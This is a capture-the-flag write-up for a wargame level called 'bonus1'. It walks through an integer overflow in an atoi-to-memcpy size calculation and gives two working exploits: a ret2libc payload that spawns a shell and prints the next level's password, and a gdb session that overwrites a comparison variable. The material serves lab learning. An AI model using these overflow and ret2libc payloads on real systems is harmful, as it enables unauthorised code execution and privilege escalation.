For the bonus1, the binary takes two arguments.

The first is a string for atoi.
If the return of atoi is greater than 9 the program stops.
In assembly code, we found that the return value of atoi is multiplied by 4.

   0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx

And the result is use as parameter of size for memcpy.
To pass the condition we send a number under 9, when multiplied with 4 
will allow the overflow on an unsigned.

- (UINT_MAX / 4) = - (4294967295 / 4) = -1073741823

For the overflow we take little bit greater = -1073741803.

First thing we tried is to exploit the binary with a ret2libc method.

/*The second argument is a string too, which is used by memcpy as a source.
So we have to exploit the memcpy with a "ret2libc" method.
We have to find the offset to control eip.

With a pattern generator we find the offset at 56.
Now we can control eip, we can use a "/bin/sh" string, it's stocked at: 0x8048583.
We can use it with the system function ;

(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>

For that we send:

./bonus1 [arg1] [PADDING + ADDRESS SYSTEM + 4 BYTES + ADDRESS /bin/sh]

The 4 bytes between adress are used to skip the return adress of the main function.

./bonus1 "-1073741803" $(python -c 'print "A" * 56 + "\x60\xb0\xe6\xb7" + "OUAI" + "\x83\x85\x04\x08"')
$ id
uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
*/


This is the second solution :

Same as the fist solution we need to pass the first comparison.
We need this number to be big enough after the overflow.
After seeing the memory, we can see the variable of the comparison is 44 bits
after our buffer.
This means our argv1 multiplied by 4 should be equal or more to 44.

./a.out -2147483637
-2147483637 -> 44

(gdb) r "3" "$(python -c 'print "A" * 40')"
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus1/bonus1 "3" "$(python -c 'print "A" * 40')"

Breakpoint 1, 0x08048480 in main ()
(gdb) x/100x $esp
0xbffff680:	0xbffff694	0xbffff8b3	0x0000000c	0x080482fd
0xbffff690:	0xb7fd13e4	0x41414141	0x41414141	0x41414141
0xbffff6a0:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
0xbffff6b0:	0xb7fed280	0x00000000	0x080484b9	0x00000003 <= this is where the comparison value is stocked ($esp + 0x3c)
0xbffff6c0:	0x080484b0	0x00000000	0x00000000	0xb7e454d3
0xbffff6d0:	0x00000003	0xbffff764	0xbffff774	0xb7fdc858
0xbffff6e0:	0x00000000	0xbffff71c	0xbffff774	0x00000000
0xbffff6f0:	0x0804821c	0xb7fd0ff4	0x00000000	0x00000000

(gdb) x/4x $esp + 0x3c
0xbffff6bc:	0x00000003	0x080484b0	0x00000000	0x00000000

(gdb) r "-2147483637" "$(python -c 'print "A" * 50 ')"

Breakpoint 1, 0x08048480 in main ()
(gdb) x/32x $esp
0xbffff670:	0xbffff684	0xbffff8a9	0x0000002c	0x080482fd
0xbffff680:	0xb7fd13e4	0x41414141	0x41414141	0x41414141
0xbffff690:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6b0:	0x080484b0	0x00000000	0x00000000	0xb7e454d3
0xbffff6c0:	0x00000003	0xbffff754	0xbffff764	0xb7fdc858
0xbffff6d0:	0x00000000	0xbffff71c	0xbffff764	0x00000000
0xbffff6e0:	0x0804821c	0xb7fd0ff4	0x00000000	0x00000000

By sending too much "A" $esp + 0x3c is overwritten

(gdb) x/4x $esp + 0x3c
0xbffff6ac:	0x41414141	0x080484b0	0x00000000	0x00000000

So we need to send 44 - HEX VALUE = 44 - 4 = 40

(gdb) r "-2147483637" "$(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')"

(gdb) x/x $esp + 0x3c
0xbffff6ac:	0x574f4c46

In memory the value is stocked at the perfect place and the comparison in the
binary is passed and we get a shell.
